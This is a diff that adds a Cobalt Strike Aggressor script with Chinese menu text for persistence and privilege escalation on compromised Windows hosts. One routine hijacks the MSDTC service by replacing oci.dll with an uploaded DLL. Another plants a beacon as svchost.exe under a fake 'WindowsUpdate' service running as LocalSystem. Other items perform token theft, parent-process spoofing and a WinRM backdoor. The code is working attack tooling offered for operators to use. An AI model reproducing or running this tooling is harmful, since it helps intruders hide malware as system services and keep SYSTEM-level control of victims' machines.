@@ -1,0 +1,122 @@
+sub do_msdtchijack{
+    $dll = $3['file'];
+    $name = split("\\\\", $dll);
+    $dllname = $name[-1];
+    $dllname_w = $3['file2']."\\\\oci.dll";
+    foreach $id ($bid){
+        if(-isadmin $id){
+            btask($id, "配置msdtc dll劫持");
+            bshell($id, "sc stop msdtc");
+            bshell($id, "del C:\\Windows\\System32\\oci.dll /F");
+            bupload($id, $dll);
+            bmv($id, $dllname, $dllname_w);
+            bshell($id, "sc config msdtc start= auto");
+            bshell($id, "sc config msdtc obj= LocalSystem");
+            bshell($id, "sc start msdtc");
+        }else{
+            btask($id, "不是Administrator权限");
+        }
+    }
+}
+
+sub do_servicerun{
+    $exename = $3["exename"];
+    $data = artifact_payload("$3['listener']", "svcexe", "$3['arch']");
+    $handle = openf(">".script_resource("tmp/".$exename));
+    writeb($handle, $data);
+    close($handle);
+    btask($3["bid"], "生成服务马，Listener:$3['listener'] 位数:$3['arch'] 保存名称:$exename");
+    bupload!($3["bid"], script_resource("tmp/".$exename));
+    bmv($3['bid'], $exename, $3["uploadoutpath"].$exename);
+    btask($3["bid"], "上传到$3['uploadoutpath']");
+    $command = "sc create WindowsUpdate binPath= ".$3['uploadoutpath'].$exename." start= auto obj= LocalSystem DisplayName= windowsupdate";
+    btask($3["bid"], "run $command");
+    bshell($3["bid"],  $command);
+    btask($3["bid"], "Query WindowsUpdate Service");
+    bshell($3["bid"], "sc qc WindowsUpdate");
+    btask($3["bid"], "Run WindowsUpdate Service");
+    bshell($3["bid"], "sc start WindowsUpdate");
+}
+
+sub do_tokenrun{
+    foreach $id ($bid){
+        bexecute_assembly($id, script_resource("bin/systemcmd.exe"), "$3['ProcessID'] $3['ExecutePath']");
+    }
+
+}
+sub do_tokendown{
+    foreach $id ($bid){
+        if(-is64 $id)
+        {
+            bdllspawn($id, script_resource("bin/SelectMyParent.x64.dll"), "$3['ProcessID'] $3['ExecutePath']","SelectMyParent", 5000, false);
+        } else {
+            bdllspawn($id, script_resource("bin/SelectMyParent.dll"), "$3['ProcessID'] $3['ExecutePath']", "SelectMyParent", 5000, false);
+        }
+    }
+}
+
+
+sub dialog_service{
+    foreach $id ($bid){
+        $dialog = dialog("ServiceRunBeacon", %(uploadoutpath => "C:\\Windows\\Temp\\", arch => barch($id) ,exename => "svchost.exe", servicename => "WindowsUpdate", bid => $id), &do_servicerun);
+        dialog_description($dialog, "生成服务马上传执行，进行权限维持");
+        drow_text($dialog, "arch", "arch:");
+        drow_text($dialog, "uploadoutpath", "uploadoutpath:");
+        drow_text($dialog, "servicename",  "servicename:");
+        drow_text($dialog, "exename", "outputexename:");
+        drow_listener($dialog, "listener", "Listener: ");
+        dbutton_action($dialog, "run");
+        dialog_show($dialog);
+    }
+
+}
+
+
+sub dialog_msdtc{
+    $dialog = dialog("msdtc DLL hijack config", %(file => "",file2 => "C:\\Windows\\System32"), &do_msdtchijack);
+    dialog_description($dialog, "msdtc DLL劫持");
+    drow_file($dialog, "file", "DLL Path:");
+    drow_text($dialog, "file2", "RHOST Path:");
+    dbutton_action($dialog, "RUN");
+    dialog_show($dialog);
+}
+sub dialog_tokenup{
+    $dialog = dialog("tokenrun", %(bid => $bid, ProcessID => "winlogon", ExecutePath => "C:\\Windows\\System32\\cmd.exe"), &do_tokenrun);
+    dialog_description($dialog, "<ProcessID> <ExecutePath> 如果进程的权限是SYSTEM,提权到SYSTEM杀毒会杀");
+    drow_text($dialog, "ProcessID","PID:");
+    drow_text($dialog, "ExecutePath", "executepath:");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+}
+sub dialog_tokendown{
+    $dialog = dialog("tokendown", %(bid => $bid, Process => "winlogon", ExecutePath => "C:\\Windows\\System32\\cmd.exe"), &do_tokendown);
+    dialog_description($dialog, "<ProcessID> <ExecutePath> ");
+    drow_text($dialog, "ProcessID","PID:");
+    drow_text($dialog, "ExecutePath", "executepath:");
+    dbutton_action($dialog, "Run");
+    dialog_show($dialog);
+}
+
+menu "权限维持"{
+    item "&cs服务马"{
+            $bid = $1;
+            dialog_service($bid);
+        }
+    item "&winrm后门"{
+            $bid = $1;
+            winrm_config($bid);
+        }
+
+    item "&msdtc DLL劫持"{
+            $bid = $1;
+            dialog_msdtc($bid);
+        }
+    item "&令牌提权"{
+            $bid = $1;
+            dialog_tokenup($bid);
+        }
+    item "&令牌降权"{
+            $bid = $1;
+            dialog_tokendown($bid);
+        }
+}
